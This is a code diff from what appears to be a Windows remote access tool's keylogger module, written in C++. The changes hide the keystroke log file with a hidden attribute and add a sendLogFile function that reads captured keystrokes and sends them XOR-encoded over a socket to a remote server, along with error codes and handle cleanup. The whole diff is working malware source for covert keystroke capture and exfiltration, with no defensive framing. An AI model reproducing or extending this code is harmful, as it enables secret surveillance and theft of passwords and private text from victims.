@@ -2,7 +2,7 @@
 #include "../inc/Keylogger.h"
 #include "../inc/other.h"
 #include "../inc/ErrorCodes.h"
-
+#include "../inc/common.h"
 
 Keylogger::Keylogger()
 {
@@ -270,7 +270,6 @@ VOID Keylogger::directSendKeystroke() //for directTcp
                         wcout << "\nerror in socket ...\n" << endl;
                         wcout << GetLastError() << endl;
                         directSendKeystrokeRunning = FALSE;
-
                     } 
                 }
             }
@@ -323,27 +322,16 @@ INT Keylogger::silenciousStop()//return 1 if error
    if(!silenciousBackgroundRunning)
    {
         //silencious thread is not started. 
-        return 1;   
+        return RATEL_ERROR_SILENCIOUS_NOT_STARTED;   
    }
 
     silenciousBackgroundRunning = FALSE;
-    return 0;
+    return RATEL_ERROR_SUCCESS;
 }
 
 
 INT Keylogger::silenciousStart()//return 1 if error
 {
-    /*
-    Algo:
-    1- (silenciousCreateFile)
-        1.1- Test if exist.
-        1.2- Set handle of the a_file_name.
-        1.3- Hide a_file_name.
-    2- (silenciousThread) Start thread.
-        2.1- (silenciousKeyboardListeningAndWriteFile)
-            2.1.1- (silenciousWriteKeystrokeInFile)
-    */
-
        //if error. If the file does not exist 
     DWORD status_error_codes;
     if(silenciousCreateFile(&status_error_codes) == NULL)
@@ -354,7 +342,7 @@ INT Keylogger::silenciousStart()//return 1 if error
         {
             wcout << "error access denied baby !!" << endl; //TO test
         }
-        return 1; // Fatal error
+        return RATEL_ERROR_FAILS; // Fatal error
     }
     else //To delete
     {
@@ -363,31 +351,48 @@ INT Keylogger::silenciousStart()//return 1 if error
 
     setPathLogFile();
 
+   
     HANDLE hThread  = CreateThread(NULL, 0, silenciousThread ,this ,0 ,NULL);
-    return 0;
+    
+    return RATEL_ERROR_SUCCESS;
 }
 
 INT Keylogger::silenciousClean()
 {
+    if(silenciousBackgroundRunning)
+    {  
+        //if keylogger is running.
+        return RATEL_ERROR_KEYLOGGER_IS_WORKING;
+    }
+
     if(a_path_log_file.empty())
     {
-        return 1; //error
+        //if the file is not present
+        return RATEL_ERROR_LOG_FILE_NOT_PRESENT;
     }
+
     if(DeleteFileW(a_path_log_file.c_str()) == 0)
     {
         wcout << "error delete log file: " << GetLastError() << endl;
-        /*
+        
         if(GetLastError() == ERROR_SHARING_VIOLATION && silenciousBackgroundRunning)
         {
-            return  101;//RATEL_ERROR_FILE_MANIPULATION;
+            return  RATEL_ERROR_FILE_MANIPULATION;//RATEL_ERROR_FILE_MANIPULATION;
         }
-        */
-        return 1;//error
+        else if (GetLastError()== ERROR_ACCESS_DENIED)
+        {
+            return RATEL_ERROR_ACCESS_DENIED;
+        }
+        else
+        {
+            return RATEL_ERROR_FAILS; //if none of the errors are known 
+        }
+        
     }
     else
     {
-        
-        return 0;
+        wcout <<"detele file ?"  <<GetLastError() << endl;
+        return RATEL_ERROR_SUCCESS;
     }
 }
 
@@ -431,6 +436,8 @@ VOID Keylogger::silenciousKeyboardListeningAndWriteFile()
                 }
             }
         }
+        CloseHandle(hFile);
+        hFile = NULL;
     }
 }
 
@@ -456,8 +463,7 @@ HANDLE Keylogger::silenciousCreateFile(DWORD *ERROR_CODES) //return NULL if erro
         dwCreationDisposition = CREATE_NEW;
     }
 
-
-    hFile = CreateFileW(a_path_log_file.c_str(),  (GENERIC_READ | FILE_APPEND_DATA) , (FILE_SHARE_READ | FILE_SHARE_WRITE), NULL, dwCreationDisposition, FILE_ATTRIBUTE_NORMAL, NULL); //Crée ou ouvre un fichier ou un périphérique d'E / S. 
+    hFile = CreateFileW(a_path_log_file.c_str(),  (GENERIC_READ | FILE_APPEND_DATA) , (FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE), NULL, dwCreationDisposition, FILE_ATTRIBUTE_HIDDEN, NULL); //Crée ou ouvre un fichier ou un périphérique d'E / S. 
     wcout << "last error createfile: " << GetLastError() << endl;
     wcout << "CreateFile hFile: " << hFile << endl; 
     
@@ -474,6 +480,12 @@ HANDLE Keylogger::silenciousCreateFile(DWORD *ERROR_CODES) //return NULL if erro
         if(ERROR_CODES != NULL){*ERROR_CODES = 0;}
         return hFile;
     }
+}
+
+
+VOID  Keylogger::silenciousHideFile()
+{
+    
 }
 
 
@@ -498,6 +510,7 @@ vector <string> Keylogger::dumpAllData()
     if(!checkIfFileExist(a_path_log_file))
     //If checkIfFileExist fails then the silent functionCreateFileAndHideFile is called.
     {
+        
        return vector<string>(); // retourn vector empty if error
     }
 
@@ -506,6 +519,7 @@ vector <string> Keylogger::dumpAllData()
     if(hFile == NULL)
     {   //if it is impossible to return the handle
         wcout << "if it is impossible to create the log file" << endl;
+        CloseHandle(hFile);
         return vector<string>(); // retourn vector empty if error
     }
     
@@ -517,7 +531,6 @@ vector <string> Keylogger::dumpAllData()
     {
         if(!ReadFile(hFile, &chBuff, sizeof(chBuff) ,&dwRead,NULL))
         {
-            wcout << " readFromPipe Error in read pipe childen out" << endl;
             break;
         }
         if(dwRead == 0)
@@ -535,6 +548,92 @@ vector <string> Keylogger::dumpAllData()
     CloseHandle(hFile);
     return result;
 }
+
+
+INT Keylogger::sendLogFile()
+{
+    INT status;
+    wstring data_encrypt;
+    INT error_codes;
+    wcout << "stape 1 " << endl;
+    //1: Test if the log file exists: 
+    if(!checkIfFileExist(a_path_log_file))
+    {
+        wcout << "file not present " << endl;
+        error_codes = RATEL_ERROR_LOG_FILE_NOT_PRESENT;
+        data_encrypt = XOREncryption(L"MOD_KEYLOGGER:download:" SPLIT + int_to_wstring(error_codes));
+
+        status = send(a_sock, (char *)data_encrypt.c_str(),  data_encrypt.length() * sizeof(WCHAR),0 );
+        
+        return RATEL_ERROR_LOG_FILE_NOT_PRESENT;
+    }
+
+    else
+    {
+        error_codes = RATEL_ERROR_SUCCESS;
+        data_encrypt =  XOREncryption(L"MOD_KEYLOGGER:download:" SPLIT + int_to_wstring(error_codes));
+        
+        status = send(a_sock, (char *)data_encrypt.c_str(),  data_encrypt.length() * sizeof(WCHAR),0 );
+        if(status == SOCKET_ERROR)
+        {
+            return RATEL_ERROR_FAILS;
+        }
+    }
+
+    //010101010010101010101
+
+    wcout << "ok go to read file and sand buff baby" << endl;
+    
+    //2: Returns the file handle:
+    HANDLE hFile = silenciousCreateFile(NULL);
+    if(hFile == NULL)
+    {
+        wcout << "file not present fuck !" << endl;
+        return RATEL_ERROR_FAILS;
+    }
+
+    //3: Read and send text in server.
+
+    CHAR buff[2048]={0};
+    DWORD dwRead;
+
+    while (TRUE)
+    {
+        if(!ReadFile(hFile, &buff, sizeof(buff), &dwRead, NULL))
+        {
+            break;
+        }
+
+        if(dwRead == 0)
+        {
+            break;
+        } 
+        Sleep(20);
+
+        data_encrypt = XOREncryption(ConvertUtf8ToWide(buff));
+        wcout << "data: \n " << data_encrypt << endl;
+
+        status = send(a_sock, (char *)data_encrypt.c_str(), data_encrypt.length() * sizeof(WCHAR), 0);
+        if(status == SOCKET_ERROR)
+        {
+            wcout << "fuck error network" << endl;
+            break;
+        }
+    }
+
+    if(status ==  SOCKET_ERROR)
+    {
+        return RATEL_ERROR_NETWORK_ERROR;
+    }
+    
+    //4: send end connection
+    Sleep(200);
+    send(a_sock, (char *)XOREncryption(L"\r\n").c_str() , 4, 0);
+
+    wcout << "finish !" << endl;
+    return RATEL_ERROR_SUCCESS;
+}
+
 
 //-------------------------------------------------------------------------------------------------------------------
 Keylogger::~Keylogger()
